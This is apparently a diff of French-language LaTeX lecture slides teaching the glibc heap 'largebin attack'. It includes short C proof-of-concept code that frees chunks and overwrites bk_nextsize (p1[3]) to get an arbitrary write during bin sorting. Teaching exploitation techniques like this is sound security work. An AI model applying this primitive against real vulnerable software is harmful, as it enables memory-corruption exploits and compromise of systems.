@@ -895,39 +895,20 @@
 
 \begin{frame}[fragile]{Largebin Attack (1/3)}
     \begin{ccode}
-        int main(){
-                /* Désactiver le buffering entrée/sortie pour éviter que les flux n’interfèrent avec la heap */
-                setvbuf(stdin, NULL, _IONBF, 0);
-                setvbuf(stdout, NULL, _IONBF, 0);
-                setvbuf(stderr, NULL, _IONBF, 0);
+        size_t target = 0;
+        size_t *p1 = malloc(0x428), *g1 = malloc(0x18);
+        size_t *p2 = malloc(0x418), *g2 = malloc(0x18);
 
-                size_t target = 0;
-                size_t *p1 = malloc(0x428), *g1 = malloc(0x18);
-                size_t *p2 = malloc(0x418), *g2 = malloc(0x18);
-
-                free(p1);
-                size_t *g3 = malloc(0x438);
-                free(p2);
-
-                p1[3] = (size_t)((&target) - 4); /* Écrase les métadonnées du pointeur */
-                size_t *g4 = malloc(0x438);
-                assert((size_t)(p2 - 2) == target);
-                return 0;
-            }
+        free(p1);
+        size_t *g3 = malloc(0x438);
+        free(p2);
     \end{ccode}
 \end{frame}
 
 \begin{frame}[fragile]{Largebin Attack (2/3)}
     \begin{ccode}
-        int main(){
-                size_t *p1 = malloc(0x428), *g1 = malloc(0x18);
-                size_t *p2 = malloc(0x418), *g2 = malloc(0x18);
-
-                free(p1);
-                size_t *g3 = malloc(0x438);
-                free(p2);
-
-            }
+        p1[3] = (size_t)((&target) - 4);
+        size_t *g4 = malloc(0x438);
     \end{ccode}
 
     \begin{tikzpicture}[
@@ -993,14 +974,11 @@
 
 
 \begin{frame}[fragile]{Largebin Attack (3/3)}
-    \begin{ccode}
-        int main()
-        {
-                /* Écrase les métadonnées du pointeur */
-                p1[3] = (size_t)((&target) - 4);
-                size_t *g4 = malloc(0x438);
-            }
-    \end{ccode}
+    \begin{itemize}
+        \item \textbf{Cible} : Écriture arbitraire lors du tri.
+        \item Vérifie si le chunk rentre dans le bin.
+        \item Corruption de \texttt{bk\_nextsize}.
+    \end{itemize}
 
     \begin{tikzpicture}[
         bin/.style={
